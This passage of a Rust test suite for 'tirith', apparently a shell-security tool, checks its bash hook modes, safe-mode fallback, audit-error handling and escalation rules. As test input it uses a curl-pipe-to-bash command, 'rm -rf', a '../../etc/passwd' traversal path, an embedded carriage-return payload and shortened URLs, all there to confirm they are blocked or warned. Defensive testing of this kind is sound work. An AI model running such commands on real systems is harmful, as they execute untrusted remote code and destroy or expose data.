        "trailing \\r should not trigger control_chars block"
    );
}

#[cfg(unix)]
#[test]
fn paste_embedded_cr_blocks() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(b"safe\rmalicious")
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "embedded \\r before non-\\n should trigger block"
    );
}

#[cfg(unix)]
#[test]
fn paste_windows_crlf_allows() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(b"echo hello\r\necho world\r\n")
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(0),
        "Windows \\r\\n line endings should not trigger block"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_preexec_default_outside_ssh_without_capability_cache() {
    // Issue #111: outside SSH with no proven enter-mode capability, the hook
    // must fall back to the safe default — preexec — not silently default into
    // an enter mode whose `bind -x` delivery is unverified.
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "preexec",
        "non-SSH sessions with no capability cache must default to preexec"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_enter_default_outside_ssh_with_works_capability() {
    // Issue #111: when the capability cache proves enter-mode delivery works
    // for this bash, the default outside SSH is enter mode.
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let cache_dir = tmpdir.path().join("tirith");
    fs::create_dir_all(&cache_dir).unwrap();
    fs::write(
        cache_dir.join("bash-enter-capability"),
        capability_cache_body("works"),
    )
    .unwrap();

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "enter",
        "a `works` capability cache must make enter the default outside SSH"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_honors_persistent_safe_mode() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let state_dir = tmpdir.path().join("tirith");
    fs::create_dir_all(&state_dir).unwrap();
    fs::write(state_dir.join("bash-safe-mode"), "1\n").unwrap();

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "preexec",
        "persistent safe-mode flag should force preexec"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_explicit_override_trumps_safe_mode() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let state_dir = tmpdir.path().join("tirith");
    fs::create_dir_all(&state_dir).unwrap();
    fs::write(state_dir.join("bash-safe-mode"), "1\n").unwrap();

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "export TIRITH_BASH_MODE=enter; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "enter",
        "explicit TIRITH_BASH_MODE should override safe-mode flag"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_prompt_hook_reattaches() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    // Source the hook, overwrite PROMPT_COMMAND, call the ensure helper,
    // and verify it re-attached.
    let script = format!(
        "source '{hook}'; PROMPT_COMMAND='other_fn'; _tirith_ensure_prompt_hook; [[ \"$PROMPT_COMMAND\" == *_tirith_prompt_hook* ]] && printf 'reattached' || printf 'missing'"
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "reattached",
        "_tirith_ensure_prompt_hook should reattach when overwritten"
    );
}

#[cfg(unix)]
fn expect_available() -> bool {
    Command::new("sh")
        .args(["-c", "command -v expect >/dev/null 2>&1"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

#[cfg(unix)]
fn bash_major_version() -> Option<u32> {
    let out = Command::new("bash").arg("--version").output().ok()?;
    if !out.status.success() {
        return None;
    }
    let first = String::from_utf8_lossy(&out.stdout)
        .lines()
        .next()
        .unwrap_or_default()
        .to_string();
    let marker = "version ";
    let idx = first.find(marker)?;
    let rest = &first[idx + marker.len()..];
    let major = rest.split('.').next()?.trim().parse::<u32>().ok()?;
    Some(major)
}

/// Body of a schema-1 bash enter-mode capability cache (issue #111) seeded with
/// `verdict`, keyed to the `$BASH_VERSION` and `$BASH` a bare
/// `Command::new("bash")` reports — the same bash these tests spawn. Reading
/// both in one invocation guarantees the cache matches what the spawned hook
/// will compare against. `tirith_version` is blank: the hook only enforces a
/// version match when a sibling `.hooks-version` exists, and these tests source
/// the hook from `assets/` which has none.
#[cfg(unix)]
fn capability_cache_body(verdict: &str) -> String {
    let out = Command::new("bash")
        .args(["-c", "printf '%s\\n%s' \"$BASH_VERSION\" \"$BASH\""])
        .output()
        .expect("query bash identity");
    let text = String::from_utf8_lossy(&out.stdout);
    let mut lines = text.lines();
    let bash_version = lines.next().unwrap_or_default().trim();
    let bash_path = lines.next().unwrap_or_default().trim();
    format!(
        "schema=1\ntirith_version=\nshell=bash\nbash_version={bash_version}\n\
         bash_path={bash_path}\nenter_capability={verdict}\nreason=seeded by test\n"
    )
}

#[cfg(unix)]
#[test]
fn bash_hook_startup_gate_degrade_persists() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );

    // Seed a `works` enter-mode capability verdict so the hook actually
    // *enters* enter mode — otherwise the #111 capability gate would pick
    // preexec directly and the startup health gate (the path under test here)
    // would never run.
    let cache_dir = tmpdir.path().join("tirith");
    fs::create_dir_all(&cache_dir).unwrap();
    fs::write(
        cache_dir.join("bash-enter-capability"),
        capability_cache_body("works"),
    )
    .unwrap();

    // `bash --norc --noprofile -i -c` is interactive enough for enter mode
    // to activate while skipping user config that might set
    // _TIRITH_BASH_LOADED. _TIRITH_TEST_FAIL_HEALTH=1 forces the startup
    // health gate to fail.
    let script =
        format!("_TIRITH_TEST_FAIL_HEALTH=1; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\"");
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-i", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("TIRITH_BASH_MODE")
        .env_remove("SSH_CONNECTION")
        .env_remove("SSH_TTY")
        .env_remove("SSH_CLIENT")
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "preexec",
        "health gate failure should degrade to preexec"
    );

    let flag = tmpdir.path().join("tirith/bash-safe-mode");
    assert!(
        flag.exists(),
        "safe-mode flag should be persisted after degrade"
    );

    // Re-source in a fresh shell; the persisted safe-mode flag forces preexec
    // even though the `works` capability cache is still present.
    let script2 = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out2 = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script2])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    let stdout2 = String::from_utf8_lossy(&out2.stdout);
    assert_eq!(
        stdout2, "preexec",
        "subsequent shells should start in preexec from persisted flag"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_runtime_delivery_failure_degrades_in_pty() {
    if !expect_available() {
        eprintln!("skipping PTY test: expect not available");
        return;
    }
    if bash_major_version().map(|v| v < 5).unwrap_or(true) {
        eprintln!("skipping PTY test: requires bash >= 5");
        return;
    }

    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );

    // Seed a `works` enter-mode capability verdict so the hook enters enter
    // mode (issue #111 — without a `works` cache the capability gate would pick
    // preexec directly and the runtime _tirith_enter failure path under test
    // would never run).
    {
        let cache_dir = tmpdir.path().join("tirith");
        fs::create_dir_all(&cache_dir).unwrap();
        fs::write(
            cache_dir.join("bash-enter-capability"),
            capability_cache_body("works"),
        )
        .unwrap();
    }

    // Drive the runtime _tirith_enter failure path in a real interactive
    // PTY:
    //   1. start in enter mode (the `works` capability cache + a real PTY let
    //      `bind -x` register, so the startup health gate passes),
    //   2. break PROMPT_COMMAND delivery by making it readonly without the
    //      tirith hook,
    //   3. press Enter on a command and assert the auto-degrade message
    //      appears.
    let expect_script = r#"
set timeout 20
set hook $env(HOOK_PATH)
spawn -noecho bash --norc --noprofile -i
expect -re {[$#] $}
send -- "export PS1='PROMPT> '\r"
expect "PROMPT> "
send -- "source '$hook'\r"
expect "PROMPT> "
send -- "PROMPT_COMMAND=':'; readonly PROMPT_COMMAND\r"
expect "PROMPT> "
send -- "echo PTY_RUNTIME_CHECK\r"
expect {
  -re {protection downgraded} {}
  timeout { exit 2 }
}
send -- "\r"
expect "PROMPT> "
send -- "exit\r"
expect eof
"#;

    let out = Command::new("expect")
        .args(["-c", expect_script])
        .env("HOOK_PATH", &hook)
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("TIRITH_BASH_MODE")
        .env_remove("SSH_CONNECTION")
        .env_remove("SSH_TTY")
        .env_remove("SSH_CLIENT")
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run expect");

    assert!(
        out.status.success(),
        "expect-driven PTY test failed (code {:?})\nstdout:\n{}\nstderr:\n{}",
        out.status.code(),
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );

    let flag = tmpdir.path().join("tirith/bash-safe-mode");
    assert!(
        flag.exists(),
        "runtime delivery failure should persist safe-mode flag"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_noninteractive_no_safe_mode_flag() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'"
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let flag = tmpdir.path().join("tirith/bash-safe-mode");
    assert!(
        !flag.exists(),
        "non-interactive sourcing should never write safe-mode flag"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_noninteractive_no_debug_trap() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'; trap -p DEBUG"
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.trim().is_empty(),
        "non-interactive sourcing should not install DEBUG trap, got: {stdout}"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_noninteractive_mode_resolution() {
    // Non-interactive sourcing still *resolves* a mode into `_TIRITH_BASH_MODE`
    // even though it installs nothing (invariant g; see the no-DEBUG-trap test
    // above). With no capability cache the resolved default is preexec (issue
    // #111); with a `works` cache it is enter. Either way, nothing is installed.
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );

    // No cache → preexec.
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    assert_eq!(
        String::from_utf8_lossy(&out.stdout),
        "preexec",
        "non-interactive sourcing with no capability cache resolves to preexec"
    );

    // `works` cache → enter (still nothing installed in a non-interactive shell).
    let tmpdir2 = tempfile::tempdir().expect("failed to create tmpdir");
    let cache_dir = tmpdir2.path().join("tirith");
    fs::create_dir_all(&cache_dir).unwrap();
    fs::write(
        cache_dir.join("bash-enter-capability"),
        capability_cache_body("works"),
    )
    .unwrap();
    let out2 = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir2.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out2.status.code(), Some(0));
    assert_eq!(
        String::from_utf8_lossy(&out2.stdout),
        "enter",
        "non-interactive sourcing with a `works` capability cache resolves to enter"
    );
}

#[test]
fn auto_checkpoint_cli_wiring_compiles_and_runs() {
    // Smoke test for the auto-checkpoint CLI wiring. The create-then-purge
    // logic is covered by `tirith_core::checkpoint::tests`; here we only
    // confirm `tirith check --interactive` invokes that path cleanly on a
    // destructive command.
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let workdir = tmpdir.path().join("project");
    fs::create_dir_all(&workdir).unwrap();
    fs::write(workdir.join("important.txt"), "do not delete").unwrap();

    let state_dir = tmpdir.path().join("state");

    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--interactive",
            "--",
            "rm -rf tempstuff",
        ])
        .env("XDG_STATE_HOME", &state_dir)
        .current_dir(&workdir)
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0), "rm -rf should be allowed");

    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("auto-checkpoint failed"),
        "auto-checkpoint should not report errors, got: {stderr}"
    );
}

#[cfg(unix)]
fn prepare_read_only_audit_log() -> (tempfile::TempDir, PathBuf) {
    use std::os::unix::fs::PermissionsExt;

    let tmpdir = tempfile::tempdir().expect("tempdir");
    let data_home = tmpdir.path().join("xdg-data");
    let tirith_dir = data_home.join("tirith");
    fs::create_dir_all(&tirith_dir).expect("create tirith data dir");

    let log_path = tirith_dir.join("log.jsonl");
    fs::write(&log_path, "{}\n").expect("seed audit log");
    fs::set_permissions(&log_path, std::fs::Permissions::from_mode(0o400))
        .expect("make audit log read-only");

    (tmpdir, data_home)
}

#[cfg(unix)]
fn run_check_with_audit_failure(debug: bool) -> std::process::Output {
    let (tmpdir, data_home) = prepare_read_only_audit_log();

    let mut cmd = tirith();
    cmd.env("XDG_DATA_HOME", &data_home)
        .env("APPDATA", tmpdir.path())
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--",
            "curl https://example.com/install.sh | bash",
        ]);
    if debug {
        cmd.env("TIRITH_AUDIT_DEBUG", "1");
    }

    cmd.output().expect("failed to run tirith check")
}

#[cfg(unix)]
fn run_paste_with_audit_failure(debug: bool) -> std::process::Output {
    let (tmpdir, data_home) = prepare_read_only_audit_log();

    let mut cmd = tirith();
    cmd.env("XDG_DATA_HOME", &data_home)
        .env("APPDATA", tmpdir.path())
        .args(["paste", "--shell", "posix", "--non-interactive"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    if debug {
        cmd.env("TIRITH_AUDIT_DEBUG", "1");
    }

    let mut child = cmd.spawn().expect("failed to spawn tirith paste");
    child
        .stdin
        .take()
        .expect("stdin pipe")
        .write_all(b"curl https://example.com/install.sh | bash")
        .expect("write paste input");
    child.wait_with_output().expect("wait on tirith paste")
}

#[cfg(unix)]
fn run_check_with_last_trigger_failure(debug: bool) -> std::process::Output {
    let tmpdir = tempfile::tempdir().expect("tempdir");
    let fake_data_home = tmpdir.path().join("xdg-data-file");
    fs::write(&fake_data_home, "not a directory").expect("seed fake XDG data home");

    let mut cmd = tirith();
    cmd.env("XDG_DATA_HOME", &fake_data_home)
        .env("APPDATA", tmpdir.path())
        .env("TIRITH_LOG", "0")
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--",
            "curl https://example.com/install.sh | bash",
        ]);
    if debug {
        cmd.env("TIRITH_AUDIT_DEBUG", "1");
    }

    cmd.output().expect("failed to run tirith check")
}

#[cfg(unix)]
#[test]
fn check_audit_failures_are_silent_by_default() {
    let out = run_check_with_audit_failure(false);

    assert_eq!(
        out.status.code(),
        Some(1),
        "blocked command should still exit 1"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("BLOCKED"),
        "check output should still show the verdict, got: {stderr}"
    );
    assert!(
        !stderr.contains("tirith: audit:"),
        "audit diagnostics should be suppressed by default, got: {stderr}"
    );
}

#[cfg(unix)]
#[test]
fn check_audit_failures_are_visible_with_debug_env() {
    let out = run_check_with_audit_failure(true);

    assert_eq!(
        out.status.code(),
        Some(1),
        "blocked command should still exit 1"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("tirith: audit:"),
        "debug env should surface audit diagnostics, got: {stderr}"
    );
}

#[cfg(unix)]
#[test]
fn check_last_trigger_failures_are_silent_by_default() {
    let out = run_check_with_last_trigger_failure(false);

    assert_eq!(
        out.status.code(),
        Some(1),
        "blocked command should still exit 1"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("BLOCKED"),
        "check output should still show the verdict, got: {stderr}"
    );
    assert!(
        !stderr.contains("cannot create data dir"),
        "last_trigger diagnostics should be suppressed by default, got: {stderr}"
    );
}

#[cfg(unix)]
#[test]
fn check_last_trigger_failures_are_visible_with_debug_env() {
    let out = run_check_with_last_trigger_failure(true);

    assert_eq!(
        out.status.code(),
        Some(1),
        "blocked command should still exit 1"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("cannot create data dir"),
        "debug env should surface last_trigger diagnostics, got: {stderr}"
    );
}

#[cfg(unix)]
#[test]
fn paste_audit_failures_are_silent_by_default() {
    let out = run_paste_with_audit_failure(false);

    assert_eq!(
        out.status.code(),
        Some(1),
        "blocked paste should still exit 1"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("BLOCKED"),
        "paste output should still show the verdict, got: {stderr}"
    );
    assert!(
        !stderr.contains("tirith: audit:"),
        "audit diagnostics should be suppressed by default, got: {stderr}"
    );
}

#[cfg(unix)]
#[test]
fn paste_audit_failures_are_visible_with_debug_env() {
    let out = run_paste_with_audit_failure(true);

    assert_eq!(
        out.status.code(),
        Some(1),
        "blocked paste should still exit 1"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("tirith: audit:"),
        "debug env should surface audit diagnostics, got: {stderr}"
    );
}

#[cfg(unix)]
#[test]
fn paste_oversized_input_rejected() {
    use std::io::Write;

    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    let data = vec![b'A'; 1024 * 1024 + 100];
    child.stdin.take().unwrap().write_all(&data).unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(out.status.code(), Some(1), "paste >1MiB should exit 1");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("1 MiB"),
        "stderr should mention 1 MiB limit, got: {stderr}"
    );
}

#[test]
fn receipt_verify_invalid_sha256_rejected() {
    let out = tirith()
        .args(["receipt", "verify", "../../etc/passwd"])
        .output()
        .expect("failed to run tirith");
    assert_ne!(
        out.status.code(),
        Some(0),
        "path traversal sha256 should be rejected"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("invalid sha256"),
        "stderr should mention invalid sha256, got: {stderr}"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_unexpected_rc_logic_test() {
    // Pure structural check of the if/elif/else branching for exit codes.
    let script = r#"
for rc in 0 1 2 137; do
  if [[ $rc -eq 0 ]]; then
    printf "rc=%d:ALLOW\n" "$rc"
  elif [[ $rc -eq 2 ]]; then
    printf "rc=%d:WARN\n" "$rc"
  elif [[ $rc -eq 1 ]]; then
    printf "rc=%d:BLOCK\n" "$rc"
  else
    printf "rc=%d:UNEXPECTED\n" "$rc"
  fi
done
"#;
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", script])
        .output()
        .expect("failed to run bash");
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("rc=0:ALLOW"), "rc=0 should ALLOW");
    assert!(stdout.contains("rc=1:BLOCK"), "rc=1 should BLOCK");
    assert!(stdout.contains("rc=2:WARN"), "rc=2 should WARN");
    assert!(
        stdout.contains("rc=137:UNEXPECTED"),
        "rc=137 should be UNEXPECTED"
    );
}

#[cfg(unix)]
#[test]
fn zsh_unexpected_rc_branch_logic_test() {
    let script = r#"
rc=137
if [[ $rc -eq 0 ]]; then echo ALLOW
elif [[ $rc -eq 2 ]]; then echo WARN
elif [[ $rc -eq 1 ]]; then echo BLOCK
else echo UNEXPECTED; fi
"#;
    let out = Command::new("zsh").args(["-c", script]).output();
    match out {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            assert!(
                stdout.trim() == "UNEXPECTED",
                "zsh rc=137 should be UNEXPECTED, got: {stdout}"
            );
        }
        Err(_) => {
            eprintln!("skipping zsh branch test: zsh not available");
        }
    }
}

#[cfg(unix)]
#[test]
fn fish_unexpected_rc_branch_logic_test() {
    let script = r#"set rc 137
if test $rc -eq 0; echo ALLOW
else if test $rc -eq 2; echo WARN
else if test $rc -eq 1; echo BLOCK
else; echo UNEXPECTED; end"#;
    let out = Command::new("fish").args(["-c", script]).output();
    match out {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            assert!(
                stdout.trim() == "UNEXPECTED",
                "fish rc=137 should be UNEXPECTED, got: {stdout}"
            );
        }
        Err(_) => {
            eprintln!("skipping fish branch test: fish not available");
        }
    }
}

#[cfg(unix)]
#[test]
fn bash_hook_unexpected_rc_degrades_in_pty() {
    if !expect_available() {
        eprintln!("skipping PTY test: expect not available");
        return;
    }
    if bash_major_version().map(|v| v < 5).unwrap_or(true) {
        eprintln!("skipping PTY test: requires bash >= 5");
        return;
    }

    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let marker = tmpdir.path().join("marker");

    let fake_tirith = tmpdir.path().join("tirith");
    fs::write(&fake_tirith, "#!/bin/sh\nexit 137\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&fake_tirith, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let marker_str = marker.display().to_string();
    let fake_dir = tmpdir.path().display().to_string();

    let expect_script = format!(
        r#"
set timeout 20
set hook "{hook}"
set marker "{marker_str}"
set fake_dir "{fake_dir}"
spawn -noecho bash --norc --noprofile -i
expect -re {{[$#] $}}
send -- "export PS1='PROMPT> '\r"
expect "PROMPT> "
send -- "export PATH=$fake_dir:$PATH\r"
expect "PROMPT> "
send -- "export TIRITH_BASH_MODE=enter\r"
expect "PROMPT> "
send -- "export _TIRITH_TEST_SKIP_HEALTH=1\r"
expect "PROMPT> "
send -- "source '$hook'\r"
expect "PROMPT> "
send -- "touch $marker\r"
sleep 1
send -- "\x15"
sleep 0.5
send -- "echo MODE=$_TIRITH_BASH_MODE\r"
expect {{
  -re {{MODE=preexec}} {{}}
  timeout {{ exit 2 }}
}}
send -- "exit\r"
expect eof
"#
    );

    let out = Command::new("expect")
        .args(["-c", &expect_script])
        .env("XDG_STATE_HOME", tmpdir.path().join("state"))
        .env_remove("TIRITH_BASH_MODE")
        .env_remove("SSH_CONNECTION")
        .env_remove("SSH_TTY")
        .env_remove("SSH_CLIENT")
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run expect");

    let stdout = String::from_utf8_lossy(&out.stdout);

    assert!(
        !marker.exists(),
        "marker file should not exist — command should not have executed"
    );

    assert!(
        stdout.contains("unexpected exit code") || stdout.contains("protection downgraded"),
        "output should mention degrade reason, got:\n{stdout}"
    );

    assert!(
        stdout.contains("MODE=preexec"),
        "mode should degrade to preexec, got:\n{stdout}"
    );

    let flag = tmpdir.path().join("state/tirith/bash-safe-mode");
    assert!(
        flag.exists(),
        "safe-mode flag should be persisted after unexpected rc degrade"
    );
}

/// Build a tirith Command with session and state isolation.
fn tirith_isolated(
    session_id: &str,
    state_dir: &std::path::Path,
    cwd: &std::path::Path,
) -> Command {
    let mut cmd = tirith();
    cmd.env("TIRITH_SESSION_ID", session_id)
        .env("XDG_STATE_HOME", state_dir)
        .env("TIRITH_LOG", "0")
        .current_dir(cwd);
    cmd
}

#[test]
fn escalation_repeat_count_blocks_at_threshold() {
    let tmpdir = tempfile::tempdir().expect("tempdir");
    let state_dir = tmpdir.path().join("state");
    let policy_dir = tmpdir.path().join("project/.tirith");
    fs::create_dir_all(&policy_dir).unwrap();
    fs::create_dir_all(&state_dir).unwrap();

    let policy = r#"paranoia: 1
escalation:
  - trigger: repeat_count
    rule_ids: ["*"]
    threshold: 3
    action: block
"#;
    fs::write(policy_dir.join("policy.yaml"), policy).unwrap();

    // Policy discovery walks up to `.git`, so seed one.
    fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();

    let session_id = format!("test-escalation-{}", std::process::id());
    let project_dir = tmpdir.path().join("project");

    let out1 = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args([
            "check",
            "--non-interactive",
            "--no-daemon",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/aaa",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out1.status.code(),
        Some(2),
        "1st shortened URL should exit 2 (warn), got stderr: {}",
        String::from_utf8_lossy(&out1.stderr)
    );

    let out2 = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args([
            "check",
            "--non-interactive",
            "--no-daemon",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/bbb",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out2.status.code(),
        Some(2),
        "2nd shortened URL should exit 2 (warn), got stderr: {}",
        String::from_utf8_lossy(&out2.stderr)
    );

    let out3 = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args([
            "check",
            "--non-interactive",
            "--no-daemon",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/ccc",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out3.status.code(),
        Some(1),
        "3rd shortened URL should exit 1 (escalated to block), got stderr: {}",
        String::from_utf8_lossy(&out3.stderr)
    );
}

#[test]
fn escalation_blocked_not_recorded_as_warning() {
    let tmpdir = tempfile::tempdir().expect("tempdir");
    let state_dir = tmpdir.path().join("state");
